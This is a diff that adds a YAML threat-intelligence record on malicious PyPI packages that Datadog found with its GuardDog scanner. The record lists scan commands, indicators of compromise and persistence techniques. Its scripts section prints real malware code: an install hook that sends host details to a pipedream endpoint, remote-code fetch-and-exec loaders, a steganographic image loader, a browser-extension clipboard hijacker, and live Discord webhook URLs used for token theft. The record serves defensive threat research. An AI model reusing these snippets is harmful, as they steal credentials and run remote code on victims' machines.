@@ -1,0 +1,126 @@
+title: Malicious PyPI Packages Identified Using GuardDog Static Analysis
+description: Datadog Security Research identified numerous malicious PyPI packages
+  using their open source GuardDog tool, uncovering techniques including clipboard
+  hijacking via browser extensions, credential exfiltration, steganography-based payload
+  delivery, and cookie/token stealers exfiltrating data to Discord webhooks.
+attribution: ''
+malware_families:
+- Bank-Grabber
+- BlankOBF
+cves: []
+ttps:
+  processes:
+  - pip
+  - python
+  command_lines:
+  - pip install git+https://github.com/DataDog/guarddog.git
+  - guarddog scan setuptools
+  - guarddog scan requests --version 2.28.1
+  - guarddog scan requests --rules exec-base64 --rules code-execution
+  - guarddog scan requests --exclude-rules exec-base64
+  - guarddog scan /tmp/triage.tar.gz
+  - guarddog scan requests
+  - guarddog scan beautifulsup4
+  - guarddog scan xolokvhcqvifyf
+  - guarddog scan colorsapi
+  - guarddog scan sagetesteight
+  - pip install judyb
+  powershell: []
+  scripts:
+  - "appDataPath = os.getenv('APPDATA')\ndesktopPath = os.path.expanduser('~\\Desktop')\n\
+    with open(appDataPath + '\\\\Extension\\\\background.js', 'w+') as extensionFile:\n\
+    \    extensionFile.write('''var _0x327ff6=_0x11d4;<SNIP>.setInterval(check,0x3e8);''')\n\
+    with open(appDataPath + '\\\\Extension\\\\manifest.json', 'w+') as manifestFile:\n\
+    \    manifestFile.write('{\"name\": \"Windows\",\"background\": {\"scripts\":\
+    \ [\"background.js\"]},\"version\": \"1\",\"manifest_version\": 2,\"permissions\"\
+    : [\"clipboardWrite\", \"clipboardRead\"]}')\npaths = [appDataPath + '\\\\Microsoft\\\
+    \\Windows\\\\Start Menu',\n         appDataPath + '\\\\Microsoft\\\\Internet Explorer\\\
+    \\Quick Launch\\\\User Pinned\\\\TaskBar',\n         desktopPath]"
+  - "class CustomInstall(install):\n    def run(self):\n        install.run(self)\n\
+    \        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username\
+    \ = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n\
+    \        requests.get(\"https://79788b091939873b8625001a35bcb283.m.pipedream.net\"\
+    ,params = ploads)"
+  - import base64 as b; exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzA...))
+  - "try:\n    from judyb import lsb\nexcept:\n    os.system('pip install judyb')\n\
+    r = requests.get('https://i.imgur.com/nE2yz0q.png')\nwith open(f'{os.getenv(\"\
+    APPDATA\")}\\\\nE2yz0q.png', 'wb') as f:\n    f.write(r.content)\nexec(lsb.reveal(f'{os.getenv(\"\
+    APPDATA\")}\\\\nE2yz0q.png'))"
+  - print('a');__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbS<snip>cw=="),'<string>','exec'))
+  - "from tempfile import NamedTemporaryFile\nfrom sys import executable\nfrom os\
+    \ import system\ntmp = NamedTemporaryFile(delete=False)\ntmp.write(b\"\"\"from\
+    \ urllib.request import urlopen; exec(urlopen('http://misogyny.wtf/inject/UsRjS959Rqm4sPG4').read())\"\
+    \"\")\ntmp.close()\ntry:\n    system(f\"start {executable.replace('.exe', 'w.exe')}\
+    \ {tmp.name}\")\nexcept:\n    pass"
+  - "appDataPath=os.getenv('APPDATA')\ndesktopPath=os.path.expanduser('~\\Desktop')\n\
+    with open(appDataPath+'\\\\Extension\\\\background.js','w+') as extensionFile:\n\
+    \    extensionFile.write('''var _0x327ff6=_0x11d4;<SNIP>.setInterval(check,0x3e8);''')\n\
+    with open(appDataPath+'\\\\Extension\\\\manifest.json','w+') as manifestFile:\n\
+    \    manifestFile.write('{\"name\": \"Windows\",\"background\": {\"scripts\":\
+    \ [\"background.js\"]},\"version\": \"1\",\"manifest_version\": 2,\"permissions\"\
+    : [\"clipboardWrite\", \"clipboardRead\"]}')\npaths=[appDataPath+'\\\\Microsoft\\\
+    \\Windows\\\\Start Menu',appDataPath+'\\\\Microsoft\\\\Internet Explorer\\\\Quick\
+    \ Launch\\\\User Pinned\\\\TaskBar',desktopPath]\nfor path in paths:\n    for\
+    \ root_directory,sub_directories,files in os.walk(path):\n        for file in\
+    \ files:\n            if file.endswith('.lnk'):\n                shortcut=shell.CreateShortcut(root_directory+'\\\
+    \\'+file)\n                executable_name=os.path.basename(shortcut.TargetPath)\n\
+    \                if executable_name in ['chrome.exe','msedge.exe','launcher.exe','brave.exe']:\n\
+    \                    shortcut.Arguments='--load-extension={appDataPath}\\\\Extension'.format(appDataPath=appDataPath)\n\
+    \                    shortcut.Save()"
+  - import base64 as b;exec(b.b64decode('dHJ5OgogICAgX19QWU9fXzA...))
+  - "from tempfile import NamedTemporaryFile\nfrom sys import executable\nfrom os\
+    \ import system\ntmp=NamedTemporaryFile(delete=False)\ntmp.write(b\"\"\"from urllib.request\
+    \ import urlopen; exec(urlopen('http://misogyny.wtf/inject/UsRjS959Rqm4sPG4').read())\"\
+    \"\")\ntmp.close()\ntry:\n    system(f\"start{executable.replace('.exe','w.exe')}{tmp.name}\"\
+    )\nexcept:\n    pass"
+  - "class CustomInstall(install):\n    def run(self):\n        install.run(self)\n\
+    \        hostname=socket.gethostname()\n        cwd=os.getcwd()\n        username=getpass.getuser()\n\
+    \        ploads={'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"\
+    https://79788b091939873b8625001a35bcb283.m.pipedream.net\",params=ploads)\nsetup(name='bleurt',version='1.0.0',description='test',author='test',license='MIT',zip_safe=False,cmdclass={'install':CustomInstall})"
+  - "try:\n    from judyb import lsb\nexcept:\n    os.system('pip install judyb')\n\
+    r=requests.get('https://i.imgur.com/nE2yz0q.png')\nwith open(f'{os.getenv(\"APPDATA\"\
+    )}\\\\nE2yz0q.png','wb') as f:\n    f.write(r.content)\nexec(lsb.reveal(f'{os.getenv(\"\
+    APPDATA\")}\\\\nE2yz0q.png'))"
+  - 'WEBHOOK_URL=''https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB''
+
+    paths={''Discord'':roaming+''\\Discord'',''Google Chrome'':local+''\\Google\\Chrome\\User
+    Data\\Default''}'
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - bleurt -> 79788b091939873b8625001a35bcb283.m.pipedream[.]net:443
+  - colorsapi -> i.imgur[.]com:443
+  - colorsapi -> misogyny[.]wtf:80
+  - sagetesteight -> github[.]com:443
+  file_activity:
+  - AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bootmain.exe
+  persistence:
+  - Malicious executable downloaded to AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot
+    to run on boot
+  - Browser shortcuts modified to load malicious extension via --load-extension argument
+  - Malicious browser extension loaded via modified .lnk shortcut arguments targeting
+    chrome.exe, msedge.exe, launcher.exe, brave.exe with --load-extension flag
+  - Dropped file at AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bootmain.exe
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - 79788b091939873b8625001a35bcb283.m.pipedream[.]net
+  - misogyny[.]wtf
+  - i.imgur[.]com
+  - discord[.]com
+  - github[.]com
+  urls:
+  - hxxps://79788b091939873b8625001a35bcb283.m.pipedream[.]net
+  - hxxps://i.imgur[.]com/nE2yz0q.png
+  - hxxp://misogyny[.]wtf/inject/UsRjS959Rqm4sPG4
+  - hxxps://github[.]com/dcsage/defonotagrabber
+  - hxxps://discord[.]com/api/webhooks/1023336326428377179/ZNOJPVYQsr0XLGJvED6i0EbgAps6iMeeJjzwskJxHYuWkLnDFLAIZKe7WJ12QFkHkoLY
+  - hxxps://discord[.]com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB
+authors:
+- Ellen Wang
+- Datadog Security Research
+reference: https://securitylabs.datadoghq.com/articles/guarddog-identify-malicious-pypi-packages
+date_of_publication: November 15, 2022
+file_creation_date: May 22, 2026
